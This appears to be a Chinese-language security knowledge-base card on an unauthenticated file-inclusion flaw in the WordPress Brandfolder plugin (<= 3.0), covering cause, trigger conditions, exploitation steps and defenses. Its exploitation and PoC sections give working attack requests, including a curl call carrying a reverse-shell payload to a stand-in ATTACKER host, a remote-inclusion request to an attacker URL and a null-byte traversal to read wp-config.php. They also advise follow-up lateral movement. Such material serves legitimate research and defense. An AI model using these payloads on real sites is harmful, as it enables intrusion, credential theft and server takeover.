---
id: web-php-file-inclusion-wordpress-brandfolder-wp-abspath-unauth-rce
title: WordPress Brandfolder 插件 <=3.0 callback.php 未认证 LFI/RFI：wp_abspath 参数直接拼接 require_once 实现任意文件包含
type: scenario
domain: web
path: web/php/file-inclusion
technique: wordpress-brandfolder-wp-abspath-lfi-rfi
tags:
- wordpress
- php
- plugin
- brandfolder
- lfi
- rfi
- file-inclusion
- require-once
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: <= 3.0
verification:
  verified_by: verifier-V617
  verified_at: '2026-11-12T20:56:50+08:00'
  notes: '已对照原文及59张截图核对：截图34 WPScan标题 Brandfolder <= 3.0、截图35 exploit-db 头部 Version: <=3.0 且 callback.php 的 wp_abspath 拼接 wp-load.php/media/file/image/post 五处 require_once 与卡片一致；截图36 curl callback.php?wp_abspath=/dev/shm/ 后 cmd=id 以 lexi 执行，与共享目录 wp-load.php 利用形态一致。dedup 候选 mail-masta/WP Umbrella/LatePoint 均为不同插件的包含漏洞，非同链；dup-scan 无涉及本卡 pair。未在本机复现。'
url: /docs/web/php/file-inclusion/web-php-file-inclusion-wordpress-brandfolder-wp-abspath-unauth-rce/
draft: false
kb_aliases:
- Brandfolder 插件文件包含
- callback.php wp_abspath
- WordPress 插件未认证包含
- wp-load.php 包含
- brandfolder <=3.0 LFI
---

## 一句话结论

WordPress 的 Brandfolder 插件 <= 3.0 在 `wp-content/plugins/brandfolder/callback.php` 顶部把用户可控的 `$_REQUEST['wp_abspath']` 直接拼在固定文件名 `wp-load.php`（及 `wp-admin/includes/*.php`）之前交给 `require_once`，未认证攻击者可用路径穿越（LFI）、远程 URL（RFI，需 `allow_url_include=On`）或共享可写目录（如 `/dev/shm`）中的同名 PHP 文件，让目标 PHP 进程包含并执行任意代码。

## 原理

- `callback.php` 开头依次执行 `require_once($_REQUEST['wp_abspath'] . 'wp-load.php');` 以及 `media.php`、`file.php`、`image.php`、`post.php` 等 WordPress 后台包含文件。`$_REQUEST` 同时接受 GET/POST/Cookie 输入，参数完全由客户端控制。
- `require_once` 的参数是"前缀 + 固定文件名"：把 `wp_abspath` 设为 `../../` 或绝对路径，就能让包含目标跳出插件目录读取任意本地 PHP 文件；设为 `http://evil/`（PHP 5 且 `allow_url_include=On`）则从远程加载。
- 即使 PHP 禁止远程包含，攻击者只要能向某个 PHP 进程可读的共享可写目录（如 `/dev/shm`、`/tmp`）写入名为 `wp-load.php` 的 PHP 文件，再令 `wp_abspath=/dev/shm/`，`require_once` 就会执行该文件——这等于把"任意文件写"升级为"以目标 Web 用户身份执行代码"。原文正是这样从主站 www-data shell 切到 WordPress 站点进程用户。
- 包含发生在 `require_once` 中，PHP 会执行目标文件的代码；`callback.php` 自身无认证与 CSRF 校验，伤害不依赖 WordPress 会话。

## 触发条件

- 目标 WordPress 安装并启用了 Brandfolder 插件（版本 <= 3.0），`callback.php` 可直接 HTTP 访问；
- 攻击者具备以下任一条件：可设置 `wp_abspath` 指向可读的本地 PHP 文件（LFI，配合日志/会话/上传文件包含）、可远程托管 PHP 文件且 `allow_url_include=On`（RFI）、或能向目标可读的共享目录写入 PHP 文件；
- 被包含文件需要可执行 PHP 代码（合法 `wp-load.php` 只会初始化 WordPress，不会直接执行攻击者命令）。

## 利用步骤

1. 探测 `GET /wp-content/plugins/brandfolder/callback.php` 是否返回异常/报错，确认插件存在且可直接访问。
2. 若已有任意文件写（上传 webshell、命令执行写文件等），把带 `cmd` 参数的 PHP payload 写入共享可写目录，如 `/dev/shm/wp-load.php`。
3. 请求 `callback.php?wp_abspath=/dev/shm/&cmd=id`，`require_once('/dev/shm/wp-load.php')` 执行 payload，命令以 WordPress/PHP 进程用户（原文为 lexi）执行。
4. 没有文件写原语时，按环境尝试：`wp_abspath=../../../wp-config.php%00`（PHP < 5.3.4 空字节截断读取配置）、`wp_abspath=http://attacker/`（RFI）、或结合日志包含/会话文件包含加载 payload。
5. 成功后用反弹 shell 或 webshell 巩固访问，继续横向。

## PoC

```bash
# 原文利用形态：共享目录已放置 /dev/shm/wp-load.php（内含 cmd 执行逻辑）
curl 'http://target:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/ATTACKER/5444+0>%261"'

# 公开 exploit 的通用验证形态
curl 'http://target/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00'
curl 'http://target/wp-content/plugins/brandfolder/callback.php?wp_abspath=http://attacker/'
```

## 变体与关联

- 变体：RFI 依赖 `allow_url_include=On`（默认 Off），实战更常见的是 LFI + 文件写/日志包含组合。
- 变体：`wp_abspath` 拼接的其它固定文件名（`wp-admin/includes/media.php` 等）也可作为包含目标，但第一处 `wp-load.php` 最先触发。
- 关联：[[web-php-file-inclusion-upload-jpg-script-tag-lfi]]（上传图片+包含）、[[web-php-file-inclusion-wp-umbrella-filename-unauth-rce]]（另一 WordPress 插件未认证包含）、[[web-php-file-inclusion-session-poisoning-sess-file]]（无文件写时的会话文件包含）。

## 检测与防御

- 开发/厂商：升级或移除 Brandfolder 插件；包含路径必须来自固定白名单，禁止拼接用户输入；对 `require_once` 参数做 `realpath` 校验并只允许插件目录内文件；生产环境保持 `allow_url_include=Off`。
- 审计方：全库搜索插件目录下 `require(_once)?\s*\(\s*\$_(REQUEST|GET|POST)` 模式，可快速定位同类未认证包含。
- 检测：监控对 `callback.php` 带 `wp_abspath` 参数的请求，关注路径穿越（`../`）、URL 协议前缀与 `/dev/shm/`、`/tmp/` 等共享目录；关注 Web 用户向共享目录写入 PHP 文件的行为。
